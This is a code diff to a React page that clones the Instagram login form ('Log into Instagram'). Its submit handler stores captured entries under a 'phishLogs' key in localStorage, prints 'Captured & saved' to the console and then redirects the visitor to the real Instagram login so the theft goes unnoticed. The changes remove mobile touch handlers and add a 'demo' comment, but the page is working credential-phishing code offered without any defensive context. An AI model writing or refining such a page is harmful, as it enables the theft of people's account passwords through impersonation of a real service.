@@ -19,22 +19,11 @@ export default function Home() {
     logs.push(entry);
     localStorage.setItem('phishLogs', JSON.stringify(logs));
 
+    // Log to console for demo
     console.log('Captured & saved:', entry);
 
     // Redirect to real Instagram
     window.location.href = 'https://www.instagram.com/accounts/login/';
-  };
-
-  // Handle mobile touch submit (extra safety for iOS/Android)
-  const handleTouchSubmit = (e: React.TouchEvent<HTMLFormElement | HTMLButtonElement>) => {
-    e.preventDefault();
-    e.stopPropagation();
-
-    // Trigger form submit manually on touch end
-    const form = e.currentTarget.closest('form');
-    if (form) {
-      form.dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
-    }
   };
 
   return (
@@ -562,10 +551,7 @@ export default function Home() {
             <div className="login-box">
               <h2 className="login-title">Log into Instagram</h2>
              
-              <form 
-                onSubmit={handleSubmit}
-                onTouchEnd={handleTouchSubmit}
-              >
+              <form onSubmit={handleSubmit}>
                 <input
                   type="text"
                   className="input-field"
@@ -588,21 +574,13 @@ export default function Home() {
                     <span
                       className="show-password"
                       onClick={() => setShowPassword(!showPassword)}
-                      onTouchEnd={(e) => {
-                        e.preventDefault();
-                        setShowPassword(!showPassword);
-                      }}
                     >
                       {showPassword ? 'Hide' : 'Show'}
                     </span>
                   )}
                 </div>
                
-                <button 
-                  type="submit"
-                  className="login-button"
-                  onTouchEnd={handleTouchSubmit}
-                >
+                <button type="submit" className="login-button">
                   Log in
                 </button>
               </form>
